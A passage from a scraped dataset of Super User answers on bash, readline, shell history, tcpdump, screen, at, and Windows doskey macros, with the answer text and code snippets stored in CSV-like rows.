        32   2
        64   6
       128   9
       256   9
       512   6
      1024   8
      2048   7
      4096  38
      8192  16
     16384  12
     32768   7
     65536   3
    131072   3
    262144   3
    524288   6
   2097152   2
   4194304   1
  33554432   1
 134217728   4
</pre></code>]"
323,https://superuser.com/questions575479/,"[""The problem actually boils down to the different behavior of login and non-login shells. I had set the variables that control history in my ~/.bahsrc. This file is not read when one starts a login shell, it's only read by interactive, non-login shells (from man bash): "", 'When bash is invoked as an interactive login shell, or as a \n  non-interactive  shell with the --login option, it first reads\n  and executes commands from the file /etc/profile, if that file\n  exists. After reading that file, it looks for ~/.bash_profile,\n  ~/.bash_login, and ~/.profile, in that order, and reads and\n  executes commands from the first one that exists and is \n  readable. The --noprofile option may be used when the shell is\n  started to inhibit this behavior.', '[. . . ]', 'When an interactive shell that is not a login shell  is  started, \n  bash    reads  and executes commands from ~/.bashrc, if that file\n  exists.  This    may be inhibited by using the --norc option.  The\n  --rcfile file  option    will  force  bash  to  read  and  execute commands from file instead of    ~/.bashrc.', 'Therefore, each time I logged in, or dropped to a tty, or used ssh, the .history file was getting truncated because I had not set it to the right size in ~/.profile as well. I finally realized this and simply set the variables in ~/.profile where they belong, instead of ~/.bashrc ', 'So, the reason my ~/.history was getting truncated was because I had only set the HISTORY variables in a file read by interactive, non-login shells and therefore every time I ran a different type of shell the variables would be ignored and the file would be cut accordingly.']","[<code>~/.bahsrc</code>, <code>man bash</code>, <code>--login</code>, <code>/etc/profile</code>, <code>~/.bash_login</code>, <code>~/.profile</code>, <code>--noprofile</code>, <code>.history</code>, <code>~/.profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>~/.history</code>]"
324,https://superuser.com/questions552863/,"['You customize bash via an .inputrc file in your /home/username , you can copy the default', 'here is mine (comments start with # )', ""to find out what you need to type in your inputrc on the left side (the escape code, as it can vary between laptop/desktop...), at the prompt type echo ' then type Ctrl-V followed by the key , like Home, then type '\nexample"", ""then replace each ^[ with \\e\nadd \\M- for Alt\ntheoretically you'd use \\C- for Ctrl but it currently doesn't work (windows limitation)"", 'the available commands (like backward-kill-line) are listed in http://www.gnu.org/software/bash/manual/bashref.html#index-backward_002dkill_002dline-_0028C_002dx-Rubout_0029', 'you can view existing keyboard shortcuts/bindings with bind -p or ', ""don't mess with TERMCAP""]","[<code>.inputrc</code>, <code>/home/username</code>, <code>cp /etc/inputrc.default   ~/.inputrc
</code>, <code># Key-bindings for the command-line editor.

# Ask before displaying &gt;50 items
# Since $WINDIR $PATH var can be in $PATH, this could list
# all window exectables in C:\WINDOWS
set completion-query-items 50

# Ignore case for the command-line-completion functionality
# on:  default to a Windows style console
# off: default to a *nix style console
set completion-ignore-case on

# none, visible or audible
set bell-style audible

# disable/enable 8bit input
set meta-flag on
set input-meta on
set output-meta off
set convert-meta on

# visible-stats
# Append a mark according to the file type in a listing
set visible-stats off
set mark-directories on

# Show all instead of beeping first
set show-all-if-ambiguous off

# MSYSTEM is emacs based
$if mode=emacs
    # Common to Console &amp; RXVT
    ""\C-?"": backward-kill-line          # Ctrl-BackSpace
    ""\e[2~"": paste-from-clipboard       # ""Ins. Key""
    ""\e[5~"": beginning-of-history       # Page up
    ""\e[6~"": end-of-history             # Page down

    $if term=msys # RXVT
        ""\e[7~"": beginning-of-line      # Home Key
        ""\e[8~"": end-of-line            # End Key
        ""\e[11~"": display-shell-version # F1
        ""\e[15~"": re-read-init-file     # F5
    #$endif
    #$if term=cygwin # Console
    $else
        ""\e[1~"": beginning-of-line      # Home Key
        ""\e[4~"": end-of-line            # End Key


""\e[3~"": delete-char            # Delete Key
#~      ""\e\e[D"": backward-word         # Alt-LeftArrow
#~      ""\e\e[C"": forward-word          # Alt-RightArrow
            ""\M-\e[D"": backward-word            # Alt-LeftArrow
            ""\M-\e[C"": forward-word         # Alt-RightArrow
    `#~`        ""\C-\E[D"": backward-word        # Ctrl-LeftArrow, nowork, can't be made to work
    #~`enter preformatted text here`        ""\C-\E[C"": forward-word         # Ctrl-RightArrow, nowork, can't be made to work
    #~ to see current bindings use    bind -q backward-kill-line
            ""\e\e"": kill-whole-line        # double/triple escape works :) Esc/Escape to delete current line like cmd.exe

        $endif
    $endif
</code>, <code>echo '</code>, <code>Ctrl-V</code>, <code>Home</code>, <code>'</code>, <code>$ echo ' home key ^[[1~  '
 home key
~
$ echo ' end key ^[[4~  '
 end key
~
$ echo ' pg up page up ^[[5~ '
 pg up page up
~
$ echo ' pg dn page down ^[[6~ '
 pg dn page down
~
</code>, <code>^[</code>, <code>\e</code>, <code>\M-</code>, <code>Alt</code>, <code>\C-</code>, <code>Ctrl</code>, <code>backward-kill-line</code>, <code>bind -p</code>, <code>$ bind -q backward-kill-word
backward-kill-word can be invoked via ""\M-\C-h"", ""\M-\C-?"".
~
$ bind -q backward-word
backward-word can be invoked via ""\M-\M-[D"", ""\M-b"", ""\C-\E[[D"".
~
$ bind -q beginning-of-line
beginning-of-line can be invoked via ""\C-a"", ""\M-OH"", ""\M-[1~"", ""\M-[H"".
~
</code>]"
325,https://superuser.com/questions356907/,"['Your application is probably sending packets to a specific UDP or TCP port number or to a specific IP-address.', 'You can therefore use something like TCPdump to capture that traffic.', ""TCPdump doesn't give you the real-time stats you desire but you can feed it's output to something that does (I'll try to update this answer with an answer later)."", 'Update:', 'I interrupted that after a minute by pressing Ctrl+C.', ""You'd need to add a suitable filter expression at the end of the tcpdump command to only include the traffic generated by your app (e.g. port 123)"", 'The program netbps is this:', ""It's just an example, adjust to taste.""]","[<code>$ sudo tcpdump -i eth1 -l -e -n | ./netbps
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 96 bytes
11:36:53    2143.33 Bps
11:37:03    1995.99 Bps
11:37:13    2008.35 Bps
11:37:23    1999.97 Bps
11:37:33    2083.32 Bps
131 packets captured
131 packets received by filter
0 packets dropped by kernel
</code>, <code>tcpdump</code>, <code>port 123</code>, <code>netbps</code>, <code>#!/usr/bin/perl
use strict;
use warnings;
use Time::HiRes;

my $reporting_interval = 10.0; # seconds
my $bytes_this_interval = 0;
my $start_time = [Time::HiRes::gettimeofday()];

STDOUT-&gt;autoflush(1);

while (&lt;&gt;) {
  if (/ length (\d+):/) {
    $bytes_this_interval += $1;
    my $elapsed_seconds = Time::HiRes::tv_interval($start_time);
    if ($elapsed_seconds &gt; $reporting_interval) {
       my $bps = $bytes_this_interval / $elapsed_seconds;
       printf ""%02d:%02d:%02d %10.2f Bps\n"", (localtime())[2,1,0],$bps;
       $start_time = [Time::HiRes::gettimeofday()];
       $bytes_this_interval = 0;
    }
  }
}
</code>]"
326,https://superuser.com/questions112353/,"['If you execute time then (even though which time will claim otherwise...) you execute the time command of the shell. That version does not accept -v. Instead, execute the proper time executable: [source]', 'That will work.']","[<code>time</code>, <code>which time</code>, <code>time</code>, <code>-v</code>, <code>time</code>, <code>$ /usr/bin/time -v sleep 4
</code>]"
327,https://superuser.com/questions397527/,"[""By default, History logs the time when you ran a command, but doesn't display it. The reason for this is when you run the History command, it looks for an environment variable called HISTTIMEFORMAT, which tells it how to format time. If the value is null or not set, then by default it doesn't show any time."", 'An example with some time-', ""But that's not all. Since the HISTTIMEFORMAT takes strftime values (which you can find here btw), you can do all sorts of magical things. But for what you want to do, the following works."", 'Also, if you want your HISTTIMEFORMAT to persist, consider appending it to your bashrc like so;', 'You will see the changes when you open a new tab in the terminal, or logging out and in. ']","[<code>History</code>, <code>History</code>, <code>HISTTIMEFORMAT</code>, <code>null</code>, <code>[qweet@superbox ~]$ export HISTTIMEFORMAT='%F %t '
[qweet@superbox ~]$ history
    1  2012-03-06        su -
    2  2012-03-06        jbach@mobiletribe.net
    3  2012-03-06        mysql
    4  2012-03-06        ll
    5  2012-03-06        cd /opt/
    6  2012-03-06        ll
    7  2012-03-06        exit
    8  2012-03-06        ll
    9  2012-03-06        ls -lsa
   10  2012-03-06        cd ../
   11  2012-03-06        ll
   12  2012-03-06        ll
....
</code>, <code>HISTTIMEFORMAT</code>, <code>strftime</code>, <code>[qweet@superbox ~]$ export HISTTIMEFORMAT='%F %T %t'
[qweet@superbox ~]$ history | grep -e ""2012-03-06 14:48""
 1006  2012-03-06 14:48:05      export HISTTIMEFORMAT='%F %T %t'
 1007  2012-03-06 14:48:07      history
 ...
</code>, <code>bashrc</code>, <code>echo 'HISTTIMEFORMAT=""variables here""' &gt;&gt; ~/.bashrc
</code>]"
328,https://superuser.com/questions1031/,"[""The .profile file in MacOSX works exactly how you would expect.\nSimply create the .profile file in your user directory if it doesn't exist.""]",[<code>.profile</code>]
329,https://superuser.com/questions212446/,"['readline does not bind over Ctrl-W since it is handled by the terminal driver by default:', 'To disable this, you have to run (in ~/.bashrc):', '.inputrc will not help here since it is read when Ctrl-W is still assigned to werase.', 'Also note that \\C-w format keyseqs must be enclosed in double-quotes, as above.', 'Different terminals may handle Alt-Backspace differently.', 'Xterm has a few settings to control the behavior of Alt key (called Meta in Xterm and X11 in general). With metaSendsEscape, holding Alt will prefix the keypress with an ESC (hex 1b). Without the setting (default mode), Alt will set the highest bit of the input character, resulting in special characters. (For example, Alt-N results in ESC n and î respectively.)', 'As far as I can remember, Terminal.app also has a similar setting to control the behavior of Meta/Alt/whatever-Macs-use.']","[<code>readline</code>, <code>$ stty -a
(...) werase = ^W; (...)
</code>, <code>~/.bashrc</code>, <code>stty werase undef
bind '""\C-w"": backward-kill-word'
</code>, <code>.inputrc</code>, <code>werase</code>, <code>\C-w</code>, <code>1b 7f</code>, <code>ESC DEL</code>, <code>metaSendsEscape: true</code>, <code>1b 08</code>, <code>ESC BS</code>, <code>metaSendsEscape</code>, <code>88</code>, <code>HTS</code>, <code>BS</code>, <code>metaSendsEscape</code>, <code>ESC</code>, <code>1b</code>, <code>ESC n</code>, <code>î</code>]"
330,https://superuser.com/questions355029/,"['Put the commands in ~/.bashrc. Anything in there is executed each time you log in.', 'If you need commands to only run when logging in via ssh (but not when logging in physically), you could probably test for the presence of the SSH_CONNECTION environment variable, and only run the commands if you find it exists.']","[<code>~/.bashrc</code>, <code>SSH_CONNECTION</code>]"
331,https://superuser.com/questions215896/,"[""The easiest way is to use GNU grep's features:"", ""If you're ever on another unix variant that doesn't have GNU grep, here's a portable way:""]","[<code>grep -r --include '*.java' teststring /home/user1
</code>, <code>find /home/user1 -name '*.java' -exec grep teststring {} +
</code>]"
332,https://superuser.com/questions897670/,"['To have pdfunite working on OSX, you need to install poppler—which is described as “…a PDF rendering library and command line tools used to manipulate PDF files.”—instead:']","[<code>pdfunite</code>, <code>poppler</code>, <code>brew install poppler
</code>]"
333,https://superuser.com/questions457316/,"['That is coming from SSH.  You see it because you gave the -t switch, which forces SSH to allocate a pseudo-terminal for the connection.  Traditionally, SSH displays that message to make it clear that you are no longer interacting with the shell on the remote host, which is normally only a question when SSH has a pseudo-terminal allocated.']",[<code>-t</code>]
334,https://superuser.com/questions164059/,"['Where interface is the name of your wireless card, e. g. wlan0 ']","[<code>sudo iwlist interface scan
</code>]"
335,https://superuser.com/questions117227/,"['Sorry for the wrong answer before, I missunderstood your question.', 'To have the time added before every command that you execute on the shell you can do something like this', ""This will rebind the return key. Now every time you press return instead of writing a newline \\n it will go to the beginning of the line, enter the text 'time' and a space, go to the end of the line and enter the newline \\n thereby producing the desired effect."", ""If you don't want to sacrifice your Enter Key you could make a 'second' benchmark-enter Key like F12 by binding the command like this"", 'Now instead of replacing the return key you bound F12.', 'The background of all this is that bash uses GNU readline to read commands. So readline would be a good starting point for further command manipulation, etc.']","[<code>bind 'RETURN: ""\e[1~time \e[4~\n""'
</code>, <code>bind '""\e[24~"": ""\e[1~time \e[4~\n""'
</code>]"
336,https://superuser.com/questions324874/,"['Add the following line to ~/.bashrc', 'Then source ~/.bashrc to refresh the settings', ""This should enable that feature in bash. If it doesn't work, you might have to add it to ~/.bash_profile instead of ~/.bashrc since OS X loads them a bit differently than linux I think.""]","[<code>export HISTCONTROL=ignorespace
</code>, <code>source ~/.bashrc</code>]"
337,https://superuser.com/questions18498/,"[""There's no default. The binding for 'yank-last-arg' (as listed by 'bind -p') disappears when you switch to vi mode."", 'will give you that same binding back (or pick something else)']","[<code>bind '""\e.""':yank-last-arg
</code>]"
338,https://superuser.com/questions386059/,"['screen -dmS ""$SESSION_NAME"" ""$COMMAND"" ""$ARGUMENTS"" will spawn a screen running $COMMAND in the background.', 'You can see active sessions with screen -ls and reattach with screen -r ""$SESSION_NAME"".', 'Dead sessions can be killed with screen -wipe.']","[<code>screen -dmS ""$SESSION_NAME"" ""$COMMAND"" ""$ARGUMENTS""</code>, <code>$COMMAND</code>, <code>screen -ls</code>, <code>screen -r ""$SESSION_NAME""</code>, <code>screen -wipe</code>]"
339,https://superuser.com/questions614995/,"['This question is addressed in BashFAQ/032. In your example, you would:', 'The reason why', ""doesn't behave how you're expecting is because with that syntax, you'll want to time the command sleep 1 2>/dev/null (yes, the command sleep 1 with stderr redirected to /dev/null). The builtin time works that way so as to make this actually possible."", ""The bash builtin can actually do this because... well, it's a builtin. Such a behavior would be impossible with the external command time usually located in /usr/bin. Indeed:"", 'Now, the answer to your question', 'Why does the output of some linux programs go to neither STDOUT nor STDERR?', 'is: it does, the output goes to stdout or stderr.', 'Hope this helps!']","[<code>{ time sleep 1; } 2&gt; /dev/null
</code>, <code>time sleep 1 2&gt;/dev/null
</code>, <code>time</code>, <code>sleep 1 2&gt;/dev/null</code>, <code>sleep 1</code>, <code>/dev/null</code>, <code>time</code>, <code>bash</code>, <code>time</code>, <code>/usr/bin</code>, <code>$ /usr/bin/time sleep 1 2&gt;/dev/null
$
</code>]"
340,https://superuser.com/questions38654/,"['As many of the other commenters said, the best way to do this on a daily basis is to use cron, but if you are only wanting to do it for one day, or sporadically, you can use the at command: ', 'You can use at in a variety of ways, including as a tea timer: ', ""It's quite useful for those one-off commands. "", 'Check the at manpage for more syntax goodness. ']","[<code>at</code>, <code>echo 'notify-send ""Work day is done!""' | at 4:00PM 
</code>, <code>at</code>, <code>echo 'notify-send ""Get your tea!""' | at now + 3 minutes 
echo 'notify-send ""Meeting in 1 hour with the big boss!""' | at 1pm tomorrow 
</code>]"
341,https://superuser.com/questions355383/,"['To safely paste, you could invoke a text editor in bash using CTRL + X / E.  The shell builtin fc will bring up an editor with the last command.', 'Short of killing the shell/terminal, I am not sure if there is any way to kill something after you have pasted something in, and it has gone wrong.']",[<code>fc</code>]
342,https://superuser.com/questions738583/,"['Most utilities (all POSIX compliant ones except for test and echo) support an ""end of options"" option --, so you could run:', 'This is especially useful when renaming or removing files that could potentially start with a dash. In scripts you should always use', 'instead of a plain mv ""$filename"" or, even worse, an unquoted filename.']","[<code>test</code>, <code>echo</code>, <code>--</code>, <code>mkdir -- -p
</code>, <code>mv -- ""$filename""
</code>, <code>mv ""$filename""</code>]"
343,https://superuser.com/questions284258/,"['One-liners in reverse order of length, portable unless noted.', 'sed (needs GNU sed for -i):', ""ed (needs e.g. bash for $'...' expansion and here string):"", 'awk:', 'tail:', 'read + cat:', 'bash built-ins:']","[<code>sed</code>, <code>GNU sed</code>, <code>-i</code>, <code>sed -i 1d file
</code>, <code>ed</code>, <code>bash</code>, <code>$'...'</code>, <code>ed file &lt;&lt;&lt; $'1d\nw\nq'
</code>, <code>awk</code>, <code>awk NR\&gt;1 infile &gt; outfile
</code>, <code>tail</code>, <code>tail -n +2 infile &gt; outfile
</code>, <code>read</code>, <code>cat</code>, <code>(read x; cat &gt; outfile) &lt; infile
</code>, <code>bash</code>, <code>while IFS= read -r; do ((i++)) &amp;&amp; printf %s\\n ""$REPLY"" &gt;&gt; outfile; done &lt; infile
</code>]"
344,https://superuser.com/questions756158/,"['The following is simplified a bit to help new users.', ""Well, first, it's necessary to understand the concept of standard input and standard output."", 'In Linux and other UNIX-like operating systems, each process has a standard input (stdin) and a standard output (stdout).  The usual situation is that stdin is your keyboard and stdout is your screen or terminal window.', ""So when you run ls, it will throw it's output to stdout.  If you do nothing else, it will go to your screen or terminal window, and you will view it."", 'Now, some Linux commands interact with the user, and use stdin to do that, your text editor being one of those.  It reads from stdin to accept your keystrokes, do things, and then writes stuff to stdout.', 'However, there are also non-interactive or ""filter"" commands that do NOT work interactively, but want a bunch of data.  These commands will take everything stdin has, do something to it, and then throw it to stdout', ""Let's look at another command called du - stands for disk usage.  du /usr, for example, will print out (to stdout like any other Linux command) a list of every file in that directory and it's size:"", ""As you can tell right off the bat, it isn't sorted, and you probably want it sorted in order of size."", 'sort is one of those ""filter"" commands that will take a bunch of stuff from stdin and sort it.', 'So, if we do this:', '# du /usr | sort -nr', 'we get this, which is a bit better:', 'And you can now see that the ""pipe"" connects the stdout of one command to the stdin of another.  Typically you will use it in situations like this where you want to filter, sort or otherwise manipulate the output of a command.  They can be cascaded if you want to process output through multiple filter-type commands.', ""If you type sort by itself, it will still try to read from stdin.  Since stdin is connected to your keyboard, it will be waiting for you to type, and process things until you press Control-D.  It won't prompt you since it's not really meant to be used interactively. "", ""It's possible for a program to tell whether stdin is interactive or not, so some programs may act differently if you issue them by themselves or at the end of a pipe."", 'Also, piping a program that only works interactively, like vi, will result in you having a bad time.', ""Pipes are different from redirection in that the data shuffled from one command to the next without being stored anywhere.  So, In the above example, du's output is not stored anywhere.  The majority of the time you don't want this with pipes because the reason to use pipes is to process the output of a command in some way - but, there is a command tee that lets you have your cake and eat it too, it will copy what it receives from stdin to both stdout and a file of your choosing.  You can also likely do this from bash with some arcane syntax involving ampersands and brackets that I don't know about.""]","[<code>stdin</code>, <code>stdout</code>, <code>stdin</code>, <code>stdout</code>, <code>ls</code>, <code>stdout</code>, <code>stdin</code>, <code>stdin</code>, <code>stdout</code>, <code>stdin</code>, <code>stdout</code>, <code>du</code>, <code>du /usr</code>, <code>stdout</code>, <code># du /usr
2312    /usr/games
124     /usr/lib/tc
692     /usr/lib/rygel-1.0
400     /usr/lib/apt/methods
40      /usr/lib/apt/solvers
444     /usr/lib/apt
6772    /usr/lib/gnash
</code>, <code>sort</code>, <code>stdin</code>, <code># du /usr | sort -nr</code>, <code>4213348 /usr
2070308 /usr/lib
1747764 /usr/share
583668  /usr/lib/vmware
501700  /usr/share/locale
366476  /usr/lib/x86_64-linux-gnu
318660  /usr/lib/libreoffice
295388  /usr/lib/vmware/modules
290376  /usr/lib/vmware/modules/binary
279056  /usr/lib/libreoffice/program
216980  /usr/share/icons
</code>, <code>stdout</code>, <code>stdin</code>, <code>sort</code>, <code>stdin</code>, <code>stdin</code>, <code>stdin</code>, <code>vi</code>, <code>du</code>, <code>tee</code>, <code>stdin</code>, <code>stdout</code>, <code>bash</code>]"
345,https://superuser.com/questions295398/,"['You could use the online documentation.', 'Linux man pages online & GNU Info Pages']",[]
346,https://superuser.com/questions384748/,['From http://dabase.com/u/record_wav/'],"[<code>arecord -vv -fdat stackoverflow.wav
</code>]"
347,https://superuser.com/questions1054742/,"['According to the last section of -d in man curl:', ""If you start the data with the letter @, the rest  should  be  a file  name  to read the data from, or - if you want curl to read the data from stdin. Multiple files can also be specified. Posting  data  from  a  file  named 'foobar' would thus be done with\n--data @foobar. When --data is told to read  from  a  file  like that, carriage returns and newlines will be stripped out."", ""That is you don't have to do anything fancy just prepend your filename with a @.""]",[]
348,https://superuser.com/questions186805/,"['You mention using byobu...', ""That's certainly one way of doing it.  Byobu stores 10K lines of scrollback history per window or per split (pane)."", ""You can enter scrollback easily by pressing Alt-PageUp, Alt-PageDown, or F7.  Once you're in scrollback mode, you can search forward and backward using vi-like commands.  Use /regex to search forward, and ?regex to search backward.""]","[<code>regex</code>, <code>regex</code>]"
349,https://superuser.com/questions1030122/,"[""It may come down to your version of bash, your OS, and your CPU architecture. Why don't you try it yourself? Set a variable to (2^31)-1, then increment it, set it to 2^32, then increment it, set it to 2^64, then increment it, etc."", 'Here, I just tried it myself on my Core i7 Mac running OS X ""El Capitan"" v10.11.3, and it looks like bash is using signed 64-bit integers.']",[]
350,https://superuser.com/questions502984/,"[""Which shell executes scripts when there's no shebang line (#!/path/to/shell) at the beginning? I assume /bin/sh but I can't confirm."", 'The kernel refuses to execute such scripts and returns ENOEXEC, so the exact behavior depends on the program you run such a script from.', 'In glibc, functions execv() or execve() just return ENOEXEC. But execvp() hides this error code and automatically invokes /bin/sh. (This is documented in exec(3p).)', 'What is considered ""best practices"" in terms of writing shell scripts that will run on any platform? (ok, this is sort of open-ended)', 'Either stick to sh and only POSIX-defined features, or just go full bash (which is widely available) and mention it in your requirements if distributing it.', '(Now that I think of it, Perl – or perhaps Python – would be even more portable, not to mention having a better syntax.)', ""Always add the shebang line. If using bash or zsh, use #!/usr/bin/env bash instead of hardcoding the shell's path. (However, the POSIX shell is guaranteed to be at /bin/sh, so skip env in that case.)"", '(Unfortunately, even /bin/sh is not always the same. The GNU autoconf program has to deal with many different quirks.)', ""Is it possible to write a script that tries to use zsh and falls back to bash if zsh is not available? I've tried putting two shebang lines, like below, but it just errors with bad interpreter: /bin/zsh: no such file or directory out if I try it on a machine without zsh."", ""There can only be one shebang line; everything after the newline character isn't even read by the kernel, and treated as a comment by shells."", 'It\'s possible to write a script that runs as #!/bin/sh, checks which shell is available, and runs exec zsh ""$0"" ""$@"" or exec bash ""$0"" ""$@"" depending on the result. However, the syntax used by bash and zsh is so different in various places that I would not recommend doing this for your own sanity.']","[<code>execv()</code>, <code>execve()</code>, <code>execvp()</code>, <code>sh</code>, <code>#!/usr/bin/env bash</code>, <code>/bin/sh</code>, <code>env</code>, <code>/bin/sh</code>, <code>#!/bin/sh</code>, <code>exec zsh ""$0"" ""$@""</code>, <code>exec bash ""$0"" ""$@""</code>]"
351,https://superuser.com/questions806511/,"[""From memory, Ctrl-G is the bell character, so I think that's why the second one worked.\nBut screen can be picky over what characters it accepts as it takes Ctrl-A as the command code."", 'Try this ', 'I found this on rosettacode, hopefully it will give you some options']","[<code>#!/bin/sh
# Ring the terminal bell
# echo ""\a"" # does not work in some shells
tput bel
</code>]"
352,https://superuser.com/questions238683/,"['Nothing special, you just need to add them to your declaration.\nFor example: ', 'fooanythingButBar', ""if you want the literal word 'and' between them: "", 'foo and anythingButBar']","[<code>stringOne=""foo""
stringTwo=""anythingButBar""
stringThree=$stringOne$stringTwo
echo $stringThree 
</code>, <code>stringOne=""foo""
stringTwo=""anythingButBar""
stringThree=""$stringOne and $stringTwo""
echo $stringThree 
</code>]"
353,https://superuser.com/questions344093/,"['You can do wildcard commands like ls *.rb or cp *.sh if you want to organize your scripts in the future.', 'Start early or regret later, in my opinion.', 'Editors like vim will also be able to apply the correct syntax highlighting based on shebang or file extension.', 'This can also be accomplished by using modelines in various editors. E.g. for vim:']","[<code>ls *.rb</code>, <code>cp *.sh</code>, <code>vim</code>, <code># vim: ft=sh
</code>]"
354,https://superuser.com/questions402246/,"[""Why not just use Alt+Backspace or Ctrl+W that are already mapped in most terminals. Not sure about Console. Xmodmap (man xmodmap) may be used to remap other custom keys as well. (Paradoxically, xmodmap can't remap Backspace very well because the terminal overrides the mappings, but it works well with most keys...).""]",[]
355,https://superuser.com/questions1403473/,"['The culprit is CVE-2018-20685, whose description is:', 'In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to\n  bypass intended access restrictions via the filename of . or an empty\n  filename. The impact is modifying the permissions of the target\n  directory on the client side.', 'This is part of a larger set of SCP vulnerabilities. Quoting from there:', 'SCP clients from multiple vendors are susceptible to a malicious scp\n  server performing unauthorized changes to target directory and/or\n  client output manipulation.', 'Many scp clients fail to verify if the objects returned by the scp\n  server match those it asked for. This issue dates back to 1983 and\n  rcp, on which scp is based. A separate flaw in the client allows the\n  target directory attributes to be changed arbitrarily. Finally, two\n  vulnerabilities in clients may allow server to spoof the client\n  output.', 'The commit that patched this vulnerability in OpenBSD was made on Nov. 16, 2018']",[]
356,https://superuser.com/questions382407/,"[""If you want a customized rm, don't call it rm but a name of yours, myrm, delete or whatever."", ""The rm='rm -i' alias is an horror because after a while using it, you will expect rm to prompt you by default before removing files. Of course, one day you'll run it with an account that hasn't that alias set and before you understand what's going on, it is too late."", 'In any case, a good way to be prepared for file loss or corruption is doing backups.', 'A fast alternative that will protect you against accidental file deletion or overwriting is using a file system that support unlimited snapshots like ZFS. If frequent snapshots are done automatically, you can recover the files at the state they were during the last snapshot before the incident.\n\xa0']","[<code>rm</code>, <code>rm</code>, <code>myrm</code>, <code>delete</code>, <code>rm='rm -i'</code>, <code>rm</code>]"
357,https://superuser.com/questions624149/,"['If you put HISTCONTROL=ignorespace in your .bashrc, and you put a space before the command name, it will not be added to your history.']","[<code>HISTCONTROL=ignorespace</code>, <code>$ export HISTCONTROL=ignorespace
$ grep ""passwd"" secret_password_file.txt   # added to history
$  grep ""passwd"" secret_password_file.txt  # not added to history
</code>]"
358,https://superuser.com/questions179978/,"['Try', 'This will redirect stderr output stream, which is used to report all errors, including ""Access denied"" one, to null device.']","[<code>find . -name ""filetofind"" 2&gt;/dev/null
</code>, <code>stderr</code>]"
359,https://superuser.com/questions47885/,['You can replace symbols in variables by using :'],"[<code>set _date=%DATE:/=-%
</code>]"
360,https://superuser.com/questions1320168/,"[""Reading the file is safe, although double clicking you mentioned will probably open the file in some editor that will offer you an option to make changes and save them. Missclicks happen, so I recommend commands that won't even let you change the file."", 'These are examples that work in terminal; they will only read the file:']","[<code>cat file
less file
less +F file
tail -n 5 file
tail -f file
</code>]"
361,https://superuser.com/questions481797/,"['In single quotes, no escaping is possible. There is no way how to include a single quote into single quotes. See Quoting in man bash.']",[]
362,https://superuser.com/questions251107/,"[""There's no facility within Bash to color output during completion as there is in fish and zsh. One could write completion functions that output color control sequences, but you'd have to maintain copies of the proposed completions with and without color codes or strip the out when the user makes a selection since Bash uses the selection directly normally and the color codes would get in the way."", 'If this is an important feature for you, I would recommend that you consider using zsh.', 'Update', 'Bash 4.3 readline adds a variable that enables color for tab completion to show different colors for executable files, directories, etc., during tab completion:', 'Readline in the upcoming Bash 4.4 adds a variable which enables color to indicate the matching portion of the string during tab completion.', 'You can see the values of these variables using', 'To set them, add lines(s) to your ~/.inputrc file such as:']","[<code>colored-stats
</code>, <code>colored-completion-prefix
</code>, <code>bind -v | grep color
</code>, <code>~/.inputrc</code>, <code>set colored-stats on
</code>]"
363,https://superuser.com/questions892658/,"['Having an interactive session is not enough for bind to work. For instance emacs shell provides an interactive session which passes the if [ -t 1 ] test but it does not have the line editing so any binds in your ~/.bashrc will generate the warnings. Instead, you can check if the line editing is enabled by doing something like this (is there a simpler/better way?):']","[<code>bind</code>, <code>if [ -t 1 ]</code>, <code>bind</code>, <code>~/.bashrc</code>, <code>if [[ ""$(set -o | grep 'emacs\|\bvi\b' | cut -f2 | tr '\n' ':')"" != 'off:off:' ]]; then
  echo ""line editing is on""
fi
</code>]"
364,https://superuser.com/questions1134368/,"['Create a macro definition file, for instance in notepad; name it at will and save it anywhere (for instance, in next example I used filename macros.doskey in d:\\bat\\ folder). \nAlternatively, doskey /macros>d:\\bat\\macros.doskey command will list all current macro definitions into d:\\bat\\macros.doskey file. \nA sample macro definition file could be as follows (note that ==> is my command prompt specified by prompt $Q$Q$G$S command):', 'Then, next commands should do the job:', 'For explanation, read cmd /?:', 'If /D was NOT specified on the command line, then when CMD.EXE\n  starts, it looks for the following REG_SZ/REG_EXPAND_SZ registry\n  variables, and if either or both are present, they are executed first.', 'and/or', 'Disclaimer: some AutoRun settings could eventuate in unlooked-for unwanted behaviour, e.g. as decribed in Hidden gotcha: The command processor’s AutoRun setting', 'Read Save and restore macro definitions; you could prepare a valid macros.cmd script file in one step:', 'Please keep in mind that you cannot run a Doskey macro from a batch file.']","[<code>notepad</code>, <code>macros.doskey</code>, <code>d:\bat\</code>, <code>doskey /macros&gt;d:\bat\macros.doskey</code>, <code>d:\bat\macros.doskey</code>, <code>==&gt;</code>, <code>prompt $Q$Q$G$S</code>, <code>==&gt; type d:\bat\macros.doskey
ls=dir /B $1 
ip=ipconfig $*
</code>, <code>==&gt; reg add ""HKCU\Software\Microsoft\Command Processor"" /v Autorun /d ""doskey /macrofile=\""d:\bat\macros.doskey\"""" /f
The operation completed successfully.

==&gt; reg query ""HKCU\Software\Microsoft\Command Processor"" /v Autorun

HKEY_CURRENT_USER\Software\Microsoft\Command Processor
    Autorun    REG_SZ    doskey /macrofile=""d:\bat\macros.doskey""
</code>, <code>cmd /?</code>, <code>/D</code>, <code>CMD.EXE</code>, <code>REG_SZ</code>, <code>REG_EXPAND_SZ</code>, <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun
</code>, <code>HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun
</code>, <code>AutoRun</code>, <code>macros.cmd</code>, <code>==&gt; &gt;macros.cmd (@for /F ""delims="" %G in ('doskey /macros') do @echo DOSKEY %G)

==&gt; type macros.cmd
DOSKEY ip=ipconfig $*
DOSKEY ls=dir /B $1

==&gt;
</code>]"
365,https://superuser.com/questions731425/,"[""In a shell script, $0 is the name of the currently running script.  You can use this to tell if you're being sourced or run like this:""]","[<code>$0</code>, <code>if [[ ""$(basename -- ""$0"")"" == ""script.sh"" ]]; then
    echo ""Don't run $0, source it"" &gt;&amp;2
    exit 1
fi
</code>]"
366,https://superuser.com/questions979113/,"['You have a proxy defined in your environment.  Yours appears to be 127.0.0.1:3128.', ""When you run sudo, the proxy environment variable isn't passed, which is why you can't directly resolve google.com."", 'You can see what proxy/proxies you have defined in your environment variables with this command:', 'Additional information on Ask Ubuntu', 'Note: If you want sudo to pass the HTTP proxy environment variable, try this:', 'You can also pass all environment variables using sudo -E:', 'Stack Overflow has other options for keeping the environment variable when sudoing.']","[<code>127.0.0.1:3128</code>, <code>sudo</code>, <code>google.com</code>, <code>env | grep proxy
